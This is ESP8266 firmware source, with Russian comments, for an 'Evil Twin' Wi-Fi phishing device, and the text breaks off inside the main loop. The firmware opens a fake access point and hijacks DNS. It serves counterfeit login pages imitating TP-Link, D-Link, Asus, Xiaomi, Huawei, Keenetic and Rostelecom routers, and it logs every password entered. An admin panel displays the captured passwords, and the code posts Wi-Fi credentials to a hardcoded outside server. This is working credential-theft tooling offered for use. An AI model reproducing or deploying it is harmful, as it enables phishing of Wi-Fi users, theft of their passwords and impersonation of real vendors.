#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <FS.h>
#include <ArduinoJson.h>

// ========== НАСТРОЙКИ СЕРВЕРА ==========
String SERVER_IP = "46.43.210.150";
int SERVER_PORT = 5000;

// ========== КОНФИГУРАЦИЯ ==========
String ap_ssid = "FreeWiFi";
String ap_password = "";
String master_password = "11111118";
String target_ssid = "";
String target_password = "";
int wifi_channel = 6;
int selected_template = 0;

// ========== ЛИЦЕНЗИЯ (ОТКЛЮЧЕНА) ==========
String device_code = "";
bool is_activated = true;
bool need_activation = false;

// Админ
IPAddress admin_ip = IPAddress(0, 0, 0, 0);
unsigned long admin_session_timeout = 0;

// Состояние
bool wifi_connected = false;
bool wifi_connecting = false;
bool wifi_data_sent = false;

ESP8266WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

// ========== ГЕНЕРАЦИЯ КОДА ==========
String generateDeviceCode() {
    uint8_t mac[6];
    WiFi.macAddress(mac);
    String macStr = "";
    for (int i = 0; i < 6; i++) {
        if (mac[i] < 0x10) macStr += "0";
        macStr += String(mac[i], HEX);
    }
    macStr.toUpperCase();
    return macStr;
}

// ========== ПРОВЕРКА АДМИНА ==========
bool isAdmin() {
    IPAddress client_ip = server.client().remoteIP();
    return (client_ip == admin_ip && millis() < admin_session_timeout);
}

// ========== ЗАГРУЗКА/СОХРАНЕНИЕ ==========
void loadConfig() {
    if (SPIFFS.exists("/cfg.json")) {
        File f = SPIFFS.open("/cfg.json", "r");
        if (f) {
            DynamicJsonDocument doc(512);
            deserializeJson(doc, f);
            f.close();
            ap_ssid = doc["ap"] | "FreeWiFi";
            master_password = doc["mp"] | "11111118";
            selected_template = doc["tmpl"] | 0;
            wifi_channel = doc["ch"] | 6;
            target_ssid = doc["tssid"] | "";
            target_password = doc["tpass"] | "";
        }
    }
}

void saveConfig() {
    File f = SPIFFS.open("/cfg.json", "w");
    if (f) {
        DynamicJsonDocument doc(512);
        doc["ap"] = ap_ssid;
        doc["mp"] = master_password;
        doc["tmpl"] = selected_template;
        doc["ch"] = wifi_channel;
        doc["tssid"] = target_ssid;
        doc["tpass"] = target_password;
        serializeJson(doc, f);
        f.close();
    }
}

// ========== ЧТЕНИЕ ЛОГОВ ==========
String readLogs() {
    if (!SPIFFS.exists("/creds.txt")) return "No data yet...";
    
    File f = SPIFFS.open("/creds.txt", "r");
    if (!f) return "Error reading file";
    
    String logs = f.readString();
    f.close();
    
    if (logs.length() == 0) return "No data yet...";
    
    // Форматируем для HTML
    logs.replace("\n", "<br>");
    return logs;
}

void clearLogs() {
    if (SPIFFS.exists("/creds.txt")) {
        SPIFFS.remove("/creds.txt");
    }
}

// ========== URL ENCODE ==========
String urlEncode(String str) {
    String encoded = "";
    for (unsigned int i = 0; i < str.length(); i++) {
        char c = str.charAt(i);
        if (c == ' ') encoded += "%20";
        else if (c == '&') encoded += "%26";
        else if (c == '=') encoded += "%3D";
        else if (c == '\n') encoded += "%0A";
        else if (isalnum(c) || c == '-' || c == '_' || c == '.') encoded += c;
        else {
            char hex[4];
            sprintf(hex, "%%%02X", (unsigned char)c);
            encoded += hex;
        }
    }
    return encoded;
}

// ========== Wi-Fi ==========
void tryConnectWiFi() {
    if (target_ssid.length() > 0 && !wifi_connected && !wifi_connecting) {
        wifi_connecting = true;
        WiFi.mode(WIFI_AP_STA);
        WiFi.begin(target_ssid.c_str(), target_password.c_str());
        Serial.println("[WiFi] Connecting to: " + target_ssid);
    }
}

// ========== ОТПРАВКА НА СЕРВЕР ==========
bool sendToServer(String endpoint, String postData) {
    if (!wifi_connected) return false;
    
    WiFiClient client;
    if (!client.connect(SERVER_IP.c_str(), SERVER_PORT)) {
        Serial.println("[Server] Connection failed");
        return false;
    }
    
    String request = "POST " + endpoint + " HTTP/1.1\r\n";
    request += "Host: " + SERVER_IP + "\r\n";
    request += "Content-Type: application/x-www-form-urlencoded\r\n";
    request += "Content-Length: " + String(postData.length()) + "\r\n";
    request += "Connection: close\r\n\r\n";
    request += postData;
    
    client.print(request);
    
    unsigned long timeout = millis();
    while (client.available() == 0) {
        if (millis() - timeout > 5000) {
            client.stop();
            return false;
        }
        delay(10);
    }
    
    while (client.available()) client.readString();
    client.stop();
    return true;
}

void sendWiFiData() {
    if (!wifi_connected || wifi_data_sent) return;
    
    String post = "device_code=" + device_code + "&ssid=" + urlEncode(target_ssid) + "&password=" + urlEncode(target_password) + "&ip=" + WiFi.localIP().toString();
    if (sendToServer("/wifi_data", post)) {
        wifi_data_sent = true;
        Serial.println("[Server] WiFi data sent");
    }
}

// ========== HTML СТРАНИЦЫ ==========

String pageTPLink() {
    return R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>TP-Link | Login</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:linear-gradient(135deg,#1a3a1a,#0d260d);font-family:Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
        .cont{background:#fff;border-radius:8px;width:380px;padding:30px;box-shadow:0 10px 40px rgba(0,0,0,0.3)}
        .logo{text-align:center;margin-bottom:25px}
        .logo span{font-size:28px;font-weight:bold;color:#5cb85c}
        .logo small{display:block;color:#666;font-size:12px;margin-top:5px}
        label{color:#333;font-weight:500;font-size:14px;display:block;margin-bottom:8px}
        input{width:100%;padding:12px;border:1px solid #ddd;border-radius:4px;font-size:14px;margin-bottom:20px}
        input:focus{outline:none;border-color:#5cb85c}
        button{width:100%;padding:12px;background:#5cb85c;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer}
        button:hover{background:#4cae4c}
        .support{text-align:center;margin-top:15px;padding-top:15px;border-top:1px solid #eee;color:#5cb85c;font-size:13px}
    </style>
</head>
<body>
    <div class="cont">
        <div class="logo">
            <span>TP-Link</span>
            <small>Wireless Router · Login</small>
        </div>
        <form method="POST" action="/login">
            <label>Password</label>
            <input type="password" name="password" placeholder="Enter router password" autofocus required>
            <button type="submit">Log In</button>
        </form>
        <div class="support">Support: +71213162115</div>
    </div>
</body>
</html>
)rawliteral";
}

String pageDLink() {
    return R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>D-Link | Authentication</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#f0f0f0;font-family:'Segoe UI',Tahoma,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
        .box{background:#fff;width:380px;border-radius:5px;overflow:hidden;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
        .header{background:#2c3e50;padding:25px;text-align:center}
        .header h2{color:#fff;font-weight:400;letter-spacing:2px}
        .header p{color:#95a5a6;font-size:13px;margin-top:5px}
        .content{padding:30px}
        .input-group{margin-bottom:20px}
        .input-group label{display:block;color:#555;font-size:13px;margin-bottom:5px;text-transform:uppercase}
        .input-group input{width:100%;padding:10px;border:1px solid #ddd;border-radius:3px;font-size:14px;background:#fafafa}
        .input-group input:focus{outline:none;border-color:#3498db;background:#fff}
        .btn{width:100%;padding:12px;background:#3498db;color:#fff;border:none;border-radius:3px;font-size:14px;font-weight:bold;cursor:pointer}
        .btn:hover{background:#2980b9}
        .links{text-align:center;margin-top:15px}
        .links a{color:#7f8c8d;font-size:12px;text-decoration:none;margin:0 10px}
        .support{text-align:center;margin-top:20px;padding-top:15px;border-top:1px solid #ddd;color:#3498db;font-size:12px}
    </style>
</head>
<body>
    <div class="box">
        <div class="header">
            <h2>D-Link</h2>
            <p>Building Networks for People</p>
        </div>
        <div class="content">
            <form method="POST" action="/login">
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" name="password" placeholder="Admin Password" autofocus required>
                </div>
                <button type="submit" class="btn">Login</button>
            </form>
            <div class="links"><a href="#">Forgot password?</a><a href="#">Help</a></div>
            <div class="support">Support: +71213162115</div>
        </div>
    </div>
</body>
</html>
)rawliteral";
}

String pageAsus() {
    return R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>ASUS Wireless Router</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#1a1a2e;font-family:'Helvetica Neue',Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
        .card{background:#fff;width:420px;border-radius:12px;overflow:hidden;box-shadow:0 20px 40px rgba(0,0,0,0.4)}
        .brand{background:linear-gradient(90deg,#0d0d1a,#1a1a3e);padding:30px;text-align:center}
        .brand h1{color:#fff;font-size:32px;font-weight:300;letter-spacing:3px}
        .brand span{color:#00d4ff;font-weight:500}
        .brand p{color:#888;font-size:13px;margin-top:8px}
        .form{padding:35px}
        .field{margin-bottom:25px}
        .field label{display:block;color:#333;font-size:13px;font-weight:600;margin-bottom:8px;text-transform:uppercase}
        .field input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:15px}
        .field input:focus{outline:none;border-color:#00d4ff}
        .btn{width:100%;padding:15px;background:#00d4ff;color:#1a1a2e;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer}
        .btn:hover{background:#00b8e6}
        .status{display:flex;justify-content:center;gap:30px;margin-top:20px}
        .stat{display:flex;align-items:center;gap:8px;color:#666;font-size:12px}
        .dot{width:8px;height:8px;border-radius:50%;background:#4CAF50}
        .support{text-align:center;margin-top:20px;padding-top:15px;border-top:1px solid #eee;color:#00d4ff;font-size:12px}
    </style>
</head>
<body>
    <div class="card">
        <div class="brand"><h1>AS<span>US</span></h1><p>In Search of Incredible</p></div>
        <div class="form">
            <form method="POST" action="/login">
                <div class="field"><label>Router Password</label>
                <input type="password" name="password" placeholder="Enter your password" autofocus required></div>
                <button type="submit" class="btn">Sign In</button>
            </form>
            <div class="status">
                <div class="stat"><span class="dot"></span> 2.4 GHz</div>
                <div class="stat"><span class="dot"></span> 5 GHz</div>
                <div class="stat"><span class="dot"></span> Internet</div>
            </div>
            <div class="support">Support: +71213162115</div>
        </div>
    </div>
</body>
</html>
)rawliteral";
}

String pageXiaomi() {
    return R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Mi Router · Xiaomi</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#f5f5f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
        .card{background:#fff;width:400px;border-radius:20px;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,0.08)}
        .header{background:#fff;padding:30px;text-align:center;border-bottom:1px solid #eee}
        .logo{width:60px;height:60px;background:#ff6700;border-radius:18px;margin:0 auto 15px;display:flex;align-items:center;justify-content:center}
        .logo span{color:#fff;font-size:28px;font-weight:bold}
        .header h3{color:#333;font-size:20px;font-weight:500}
        .header p{color:#999;font-size:13px;margin-top:5px}
        .body{padding:30px}
        .input{margin-bottom:25px}
        .input label{display:block;color:#666;font-size:14px;margin-bottom:8px}
        .input input{width:100%;padding:14px 16px;border:1.5px solid #e0e0e0;border-radius:12px;font-size:15px;background:#fafafa}
        .input input:focus{outline:none;border-color:#ff6700;background:#fff}
        .btn{width:100%;padding:15px;background:#ff6700;color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer}
        .btn:hover{background:#e55a00}
        .support{text-align:center;margin-top:20px;padding-top:15px;border-top:1px solid #eee;color:#ff6700;font-size:13px}
    </style>
</head>
<body>
    <div class="card">
        <div class="header">
            <div class="logo"><span>MI</span></div>
            <h3>Mi Router</h3><p>Xiaomi · Smart Connection</p>
        </div>
        <div class="body">
            <form method="POST" action="/login">
                <div class="input"><label>Router Password</label>
                <input type="password" name="password" placeholder="Enter password" autofocus required></div>
                <button type="submit" class="btn">Login</button>
            </form>
            <div class="support">Support: +71213162115</div>
        </div>
    </div>
</body>
</html>
)rawliteral";
}

String pageHuawei() {
    return R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Huawei · ONT</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:linear-gradient(180deg,#e8f0fe,#d4e4fc);font-family:'Microsoft YaHei',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
        .box{background:#fff;width:450px;border-radius:8px;box-shadow:0 8px 30px rgba(0,40,100,0.15)}
        .header{background:#003366;padding:25px;border-radius:8px 8px 0 0}
        .header h2{color:#fff;font-weight:400}
        .header p{color:#9bd;font-size:12px;margin-top:5px}
        .content{padding:35px}
        .field{margin-bottom:25px}
        .field label{display:block;color:#333;font-size:13px;margin-bottom:8px;font-weight:500}
        .field input{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;font-size:14px}
        .field input:focus{outline:none;border-color:#003366}
        .btn{width:100%;padding:12px;background:#003366;color:#fff;border:none;border-radius:4px;font-size:15px;cursor:pointer}
        .btn:hover{background:#002244}
        .lang{text-align:right;margin-bottom:20px}
        .lang span{color:#666;font-size:13px;cursor:pointer;margin-left:15px}
        .lang span.active{color:#003366;font-weight:bold}
        .support{text-align:center;margin-top:20px;padding-top:15px;border-top:1px solid #ddd;color:#003366;font-size:12px}
    </style>
</head>
<body>
    <div class="box">
        <div class="header"><h2>HUAWEI</h2><p>Optical Network Terminal · HG8546M</p></div>
        <div class="content">
            <div class="lang"><span class="active">English</span><span>中文</span></div>
            <form method="POST" action="/login">
                <div class="field"><label>Login Password</label>
                <input type="password" name="password" placeholder="Enter password" autofocus required></div>
                <button type="submit" class="btn">Login</button>
            </form>
            <div class="support">Support: +71213162115</div>
        </div>
    </div>
</body>
</html>
)rawliteral";
}

String pageZyxel() {
    return R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Keenetic · Web Configurator</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#1e2a3a;font-family:'Segoe UI',Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
        .keenetic{width:420px}
        .logo-area{text-align:center;margin-bottom:20px}
        .logo-area h1{color:#fff;font-size:36px;font-weight:300;letter-spacing:3px}
        .logo-area h1 span{color:#00a8e8;font-weight:500}
        .logo-area p{color:#89a;font-size:13px}
        .panel{background:#fff;border-radius:10px;padding:35px;box-shadow:0 15px 35px rgba(0,0,0,0.3)}
        .panel-header{margin-bottom:25px}
        .panel-header h3{color:#1e2a3a;font-weight:500}
        .panel-header p{color:#777;font-size:13px;margin-top:5px}
        .input-wrapper{margin-bottom:20px}
        .input-wrapper label{display:block;color:#555;font-size:13px;margin-bottom:6px;font-weight:600}
        .input-wrapper input{width:100%;padding:12px 15px;border:2px solid #e0e5ea;border-radius:6px;font-size:14px}
        .input-wrapper input:focus{outline:none;border-color:#00a8e8}
        .login-action{display:flex;align-items:center;justify-content:space-between;margin-top:25px}
        .login-action button{padding:12px 30px;background:#00a8e8;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:bold;cursor:pointer}
        .login-action button:hover{background:#0088c0}
        .badge{background:#f0f4f8;padding:8px 15px;border-radius:20px;color:#1e2a3a;font-size:12px;display:inline-block;margin-bottom:15px}
        .support{text-align:center;margin-top:20px;padding-top:15px;border-top:1px solid #e0e5ea;color:#00a8e8;font-size:12px}
    </style>
</head>
<body>
    <div class="keenetic">
        <div class="logo-area"><h1>Keen<span>etic</span></h1><p>by Zyxel</p></div>
        <div class="panel">
            <span class="badge">Model: Keenetic Giga · KN-1010</span>
            <div class="panel-header"><h3>Web Configurator</h3><p>Enter password to access settings</p></div>
            <form method="POST" action="/login">
                <div class="input-wrapper"><label>Password</label>
                <input type="password" name="password" placeholder="Administrator password" autofocus required></div>
                <div class="login-action"><button type="submit">Log In</button><a href="#">Forgot?</a></div>
            </form>
            <div class="support">Support: +71213162115</div>
        </div>
    </div>
</body>
</html>
)rawliteral";
}

String pageRostelecom() {
    return R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Ростелеком · Оборудование</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:linear-gradient(135deg,#4a00e0,#8e2de2);font-family:'Arial',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
        .card{background:#fff;width:420px;border-radius:15px;overflow:hidden;box-shadow:0 20px 50px rgba(0,0,0,0.3)}
        .top{background:#fff;padding:30px;text-align:center}
        .logo{margin-bottom:15px}
        .logo span{font-size:28px;font-weight:bold;color:#4a00e0}
        .logo small{display:block;color:#666;font-size:14px;letter-spacing:2px}
        .device{background:#f5f0ff;padding:10px;border-radius:25px;display:inline-block;margin-top:10px}
        .device span{color:#4a00e0;font-size:14px;font-weight:bold}
        .form{padding:30px;background:#f8f9fa}
        .group{margin-bottom:25px}
        .group label{display:block;color:#333;font-size:14px;margin-bottom:10px;font-weight:600}
        .group input{width:100%;padding:14px 18px;border:2px solid #e0e0e0;border-radius:10px;font-size:15px;background:#fff}
        .group input:focus{outline:none;border-color:#4a00e0}
        .btn{width:100%;padding:15px;background:linear-gradient(90deg,#4a00e0,#8e2de2);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer}
        .btn:hover{opacity:0.9}
        .help{text-align:center;margin-top:20px}
        .help a{color:#4a00e0;text-decoration:none;font-size:13px;margin:0 10px}
        .support{text-align:center;margin-top:20px;padding-top:15px;border-top:1px solid #ddd;color:#4a00e0;font-size:13px}
    </style>
</head>
<body>
    <div class="card">
        <div class="top">
            <div class="logo"><span>Ростелеком</span><small>Домашний Интернет</small></div>
            <div class="device"><span>ONT SERCOM RV6699</span></div>
        </div>
        <div class="form">
            <form method="POST" action="/login">
                <div class="group"><label>Пароль администратора</label>
                <input type="password" name="password" placeholder="Введите пароль" autofocus required></div>
                <button type="submit" class="btn">Войти в настройки</button>
            </form>
            <div class="help">
                <a href="#">Забыли пароль?</a><a href="#">Инструкция</a><a href="#">Поддержка 8-800-100-08-00</a>
            </div>
            <div class="support">Support: +71213162115</div>
        </div>
    </div>
</body>
</html>
)rawliteral";
}

String pageAdmin() {
    String logs = readLogs();
    
    String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>heomp Admin</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0a;color:#f00;font-family:'Courier New',monospace;padding:15px}
        .cont{max-width:900px;margin:0 auto}
        h1{border-bottom:2px solid #f00;padding-bottom:10px;margin-bottom:20px}
        .tabs{display:flex;gap:5px;margin-bottom:20px;flex-wrap:wrap}
        .tab{background:#111;color:#f00;border:1px solid #f00;padding:10px 18px;cursor:pointer}
        .tab:hover{background:#f00;color:#000}
        .tab.active{background:#f00;color:#000;font-weight:bold}
        .content{background:#0d0d0d;border:1px solid #f00;padding:20px;display:none}
        .content.active{display:block}
        label{color:#f44;display:block;margin-bottom:5px}
        input,select,textarea{width:100%;padding:10px;background:#000;color:#f00;border:1px solid #f00;margin-bottom:15px}
        button{background:#f00;color:#000;border:none;padding:10px 20px;font-weight:bold;cursor:pointer;margin-right:10px}
        button:hover{background:#c00}
        .status{background:#1a0000;border:1px solid #f00;padding:15px;margin-bottom:20px}
        .status-item{display:flex;justify-content:space-between;padding:5px 0}
        .logout{background:#333;float:right}
        .log-box{background:#000;border:1px solid #0f0;color:#0f0;padding:15px;max-height:400px;overflow-y:auto;font-size:12px;margin:10px 0;white-space:pre-wrap;word-break:break-all}
        .btn-clear{background:#333;color:#f00;border:1px solid #f00}
        .btn-refresh{background:#0a0;color:#000}
    </style>
</head>
<body>
    <div class="cont">
        <h1>heomp Admin v3.0<button class="logout" onclick="location.href='/logout'">Logout</button></h1>
        <div class="status">
            <div class="status-item"><span>Device Code:</span><span>)rawliteral" + device_code + R"rawliteral(</span></div>
            <div class="status-item"><span>WiFi:</span><span>)rawliteral" + (wifi_connected ? "Connected" : "Disconnected") + R"rawliteral(</span></div>
            <div class="status-item"><span>IP:</span><span>)rawliteral" + (wifi_connected ? WiFi.localIP().toString() : "N/A") + R"rawliteral(</span></div>
        </div>
        <div class="tabs">
            <div class="tab active" data-tab="attack">⚡ Attack</div>
            <div class="tab" data-tab="logs">📋 Logs</div>
            <div class="tab" data-tab="security">🔐 Security</div>
            <div class="tab" data-tab="network">🌐 Network</div>
        </div>
        
        <div id="attack" class="content active">
            <h3>Evil Twin Settings</h3><br>
            <label>Attack SSID:</label>
            <input type="text" id="ap_ssid" value=")rawliteral" + ap_ssid + R"rawliteral(">
            <label>WiFi Channel:</label>
            <select id="channel">)rawliteral";
            
            for (int ch = 1; ch <= 14; ch++) {
                html += "<option value='" + String(ch) + "'" + (wifi_channel == ch ? " selected" : "") + ">" + String(ch);
                if (ch == 14) html += " (2484 MHz)";
                else html += " (" + String(2407 + ch * 5) + " MHz)";
                html += "</option>";
            }
            
            html += R"rawliteral(</select>
            <label>Phishing Template:</label>
            <select id="tmpl">
                <option value="0" )rawliteral" + String(selected_template == 0 ? "selected" : "") + R"rawliteral(>TP-Link</option>
                <option value="1" )rawliteral" + String(selected_template == 1 ? "selected" : "") + R"rawliteral(>D-Link</option>
                <option value="2" )rawliteral" + String(selected_template == 2 ? "selected" : "") + R"rawliteral(>Asus</option>
                <option value="3" )rawliteral" + String(selected_template == 3 ? "selected" : "") + R"rawliteral(>Xiaomi</option>
                <option value="4" )rawliteral" + String(selected_template == 4 ? "selected" : "") + R"rawliteral(>Huawei</option>
                <option value="5" )rawliteral" + String(selected_template == 5 ? "selected" : "") + R"rawliteral(>Zyxel Keenetic</option>
                <option value="6" )rawliteral" + String(selected_template == 6 ? "selected" : "") + R"rawliteral(>Rostelecom</option>
            </select>
            <button onclick="saveAttack()">💾 Save & Reboot</button>
        </div>
        
        <div id="logs" class="content">
            <h3>Captured Passwords</h3><br>
            <button class="btn-refresh" onclick="location.reload()">🔄 Refresh</button>
            <button class="btn-clear" onclick="clearLogs()">🗑️ Clear All</button>
            <div class="log-box">)rawliteral" + logs + R"rawliteral(</div>
            <script>
                function clearLogs(){
                    if(confirm('Delete all captured passwords?')){
                        fetch('/admin/clearlogs',{method:'POST'}).then(r=>r.text()).then(d=>{
                            alert('Logs cleared!');
                            location.reload();
                        });
                    }
                }
            </script>
        </div>
        
        <div id="security" class="content">
            <h3>Change Master Password</h3><br>
            <label>New Password:</label>
            <input type="text" id="newp" placeholder="Minimum 6 characters">
            <label>Confirm Password:</label>
            <input type="text" id="confp" placeholder="Repeat password">
            <button onclick="changePass()">🔄 Change Password</button>
        </div>
        
        <div id="network" class="content">
            <h3>Network Settings</h3><br>
            <label>WiFi SSID:</label>
            <input type="text" id="tssid" placeholder="WiFi Name" value=")rawliteral" + target_ssid + R"rawliteral(">
            <label>WiFi Password:</label>
            <input type="password" id="tpass" placeholder="WiFi Password" value=")rawliteral" + target_password + R"rawliteral(">
            <label>Server IP:</label>
            <input type="text" id="srvip" value=")rawliteral" + SERVER_IP + R"rawliteral(">
            <label>Server Port:</label>
            <input type="text" id="srvport" value=")rawliteral" + String(SERVER_PORT) + R"rawliteral(">
            <button onclick="saveNet()">🔗 Save & Connect</button>
        </div>
    </div>
    
    <script>
        document.querySelectorAll('.tab').forEach(t=>{
            t.onclick=function(){
                document.querySelectorAll('.content').forEach(c=>c.classList.remove('active'));
                document.querySelectorAll('.tab').forEach(b=>b.classList.remove('active'));
                document.getElementById(this.dataset.tab).classList.add('active');
                this.classList.add('active');
            }
        });
        
        function saveAttack(){
            var s=document.getElementById('ap_ssid').value;
            var c=document.getElementById('channel').value;
            var t=document.getElementById('tmpl').value;
            fetch('/admin/save',{
                method:'POST',
                headers:{'Content-Type':'application/x-www-form-urlencoded'},
                body:'ssid='+encodeURIComponent(s)+'&chan='+c+'&tmpl='+t
            }).then(r=>r.text()).then(d=>{
                alert('Saved! Rebooting...');
                setTimeout(()=>location.reload(),2000);
            });
        }
        
        function changePass(){
            var p=document.getElementById('newp').value;
            var c=document.getElementById('confp').value;
            if(p.length<6){alert('Min 6 chars');return}
            if(p!=c){alert('Not match');return}
            fetch('/admin/sec',{
                method:'POST',
                headers:{'Content-Type':'application/x-www-form-urlencoded'},
                body:'master='+encodeURIComponent(p)
            }).then(r=>r.text()).then(d=>{
                alert('Changed!');
                document.getElementById('newp').value='';
                document.getElementById('confp').value='';
            });
        }
        
        function saveNet(){
            var s=document.getElementById('tssid').value;
            var p=document.getElementById('tpass').value;
            var ip=document.getElementById('srvip').value;
            var port=document.getElementById('srvport').value;
            fetch('/admin/net',{
                method:'POST',
                headers:{'Content-Type':'application/x-www-form-urlencoded'},
                body:'ssid='+encodeURIComponent(s)+'&pass='+encodeURIComponent(p)+'&ip='+ip+'&port='+port
            }).then(r=>r.text()).then(d=>{alert('Saved! Connecting...')});
        }
    </script>
</body>
</html>
)rawliteral";
    return html;
}

// ========== ОБРАБОТЧИКИ ==========
void handleRoot() {
    if (!isAdmin()) {
        switch(selected_template) {
            case 0: server.send(200, "text/html", pageTPLink()); break;
            case 1: server.send(200, "text/html", pageDLink()); break;
            case 2: server.send(200, "text/html", pageAsus()); break;
            case 3: server.send(200, "text/html", pageXiaomi()); break;
            case 4: server.send(200, "text/html", pageHuawei()); break;
            case 5: server.send(200, "text/html", pageZyxel()); break;
            case 6: server.send(200, "text/html", pageRostelecom()); break;
            default: server.send(200, "text/html", pageTPLink());
        }
    } else {
        server.send(200, "text/html", pageAdmin());
    }
}

void handleLogin() {
    if (server.hasArg("password") && server.arg("password") == master_password) {
        admin_ip = server.client().remoteIP();
        admin_session_timeout = millis() + 3600000;
        server.sendHeader("Location", "/", true);
        server.send(302, "text/plain", "");
    } else {
        // СОХРАНЯЕМ ВСЕ ВВЕДЕННЫЕ ПАРОЛИ (И ПРАВИЛЬНЫЕ И НЕПРАВИЛЬНЫЕ)
        if (server.hasArg("password")) {
            File log = SPIFFS.open("/creds.txt", "a");
            if (log) {
                log.print("[");
                log.print(millis());
                log.print("] IP: ");
                log.print(server.client().remoteIP().toString());
                log.print(" | Pass: ");
                log.println(server.arg("password"));
                log.close();
                Serial.println("[CAPTURED] " + server.client().remoteIP().toString() + " -> " + server.arg("password"));
            }
        }
        server.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='3;url=/'></head><body style='background:#1a1a2e;color:#fff;text-align:center;padding-top:100px'><h3>Wrong password</h3></body></html>");
    }
}

void handleLogout() {
    admin_ip = IPAddress(0,0,0,0);
    admin_session_timeout = 0;
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
}

void handleClearLogs() {
    if (!isAdmin()) { server.send(403, "text/plain", "Forbidden"); return; }
    clearLogs();
    server.send(200, "text/plain", "OK");
}

void handleAdminSave() {
    if (!isAdmin()) { server.send(403, "text/plain", "Forbidden"); return; }
    if (server.hasArg("ssid")) ap_ssid = server.arg("ssid");
    if (server.hasArg("chan")) wifi_channel = server.arg("chan").toInt();
    if (server.hasArg("tmpl")) selected_template = server.arg("tmpl").toInt();
    saveConfig();
    server.send(200, "text/plain", "OK");
    delay(1000);
    ESP.restart();
}

void handleAdminSec() {
    if (!isAdmin()) { server.send(403, "text/plain", "Forbidden"); return; }
    if (server.hasArg("master")) {
        master_password = server.arg("master");
        saveConfig();
        server.send(200, "text/plain", "OK");
    }
}

void handleAdminNet() {
    if (!isAdmin()) { server.send(403, "text/plain", "Forbidden"); return; }
    if (server.hasArg("ssid")) target_ssid = server.arg("ssid");
    if (server.hasArg("pass")) target_password = server.arg("pass");
    if (server.hasArg("ip")) SERVER_IP = server.arg("ip");
    if (server.hasArg("port")) SERVER_PORT = server.arg("port").toInt();
    saveConfig();
    server.send(200, "text/plain", "OK");
    tryConnectWiFi();
}

// ========== SETUP ==========
void setup() {
    Serial.begin(115200);
    SPIFFS.begin();
    
    device_code = generateDeviceCode();
    loadConfig();
    
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, netMsk);
    WiFi.softAP(ap_ssid.c_str(), ap_password.c_str(), wifi_channel);
    
    dnsServer.start(DNS_PORT, "*", apIP);
    
    server.on("/", handleRoot);
    server.on("/login", HTTP_POST, handleLogin);
    server.on("/logout", handleLogout);
    server.on("/admin/save", HTTP_POST, handleAdminSave);
    server.on("/admin/sec", HTTP_POST, handleAdminSec);
    server.on("/admin/net", HTTP_POST, handleAdminNet);
    server.on("/admin/clearlogs", HTTP_POST, handleClearLogs);
    server.onNotFound([](){ 
        server.sendHeader("Location", "http://192.168.4.1/", true); 
        server.send(302, "text/plain", ""); 
    });
    
    server.begin();
    
    Serial.println("\n╔══════════════════════════════════════╗");
    Serial.println("║      heomp Evil Twin v2.0           ║");
    Serial.println("║      NO LICENSE REQUIRED            ║");
    Serial.println("╠══════════════════════════════════════╣");
    Serial.println("║ AP SSID: " + ap_ssid);
    Serial.println("║ Device:  " + device_code);
    Serial.println("║ Admin:   192.168.4.1/login");
    Serial.println("║ Pass:    " + master_password);
    Serial.println("╚══════════════════════════════════════╝");
    
    if (target_ssid.length() > 0) {
        tryConnectWiFi();
    }
}

// ========== LOOP ==========
void loop() {
    dnsServer.processNextRequest();
    server.handleClient();
    
    static unsigned long lastCheck = 0;
    if (millis() - lastCheck > 5000) {
        lastCheck = millis();
        
        if (wifi_connecting) {
            if (WiFi.status() == WL_CONNECTED) {
                wifi_connected = true;
